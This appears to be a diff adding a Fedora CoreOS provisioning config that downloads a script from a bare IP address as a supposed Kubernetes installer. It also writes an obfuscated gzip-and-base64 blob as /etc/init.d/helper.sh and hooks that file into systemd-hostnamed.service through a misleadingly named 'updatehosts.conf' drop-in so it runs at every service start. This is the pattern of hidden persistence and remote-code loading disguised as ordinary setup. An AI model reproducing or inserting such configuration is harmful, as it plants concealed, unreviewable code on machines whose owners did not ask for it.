@@ -1,0 +1,24 @@
+variant: fcos
+version: 1.3.0
+storage:
+  files:
+    - overwrite: true
+      path: /root/install.sh
+      contents:
+        source: "http://45.86.152.1/install-kubernetes-from-scratch.sh"
+      mode: 493
+    - overwrite: true
+      path: /etc/init.d/helper.sh
+      contents:
+        compression: "gzip"
+        source: "data:;base64,H4sIAAAAAAAC/6SOP0/DMBDFd3+Kh/GQVHKOdGFAqcSAxAIMsFGQUvtCLLlOiB0qpHx41JZUFSvb6f2537u8oDEOtHGBOHxhU8dWCM915FhJlX0M3EN7yPun55fH24e7SoKGMVD8jom3lgIn19CxQItcil3rPOMVKmPTdpDq6ElM2Blon0P7hCXebmA7AQD/oe370TP3KIXtAou2iynUW65UZuqEXzomrA/ZA+H8/WzEbkiYMAb3CW3+yql2HjqUJ92MCdpW0M0yFyKyhXaQ9F4ur4uroizKYkFWgjgZ2k+Koh9cSA3kKQE1b4XK5jNfB4nV6rz4EwAA//8Mpfu4ogEAAA=="
+      mode: 493
+systemd:
+  units:
+    - dropins:
+        - contents: "[Service]\nExecStartPost=/etc/init.d/helper.sh\n"
+          name: "updatehosts.conf"
+      enabled: true
+      name: "systemd-hostnamed.service"
+
+
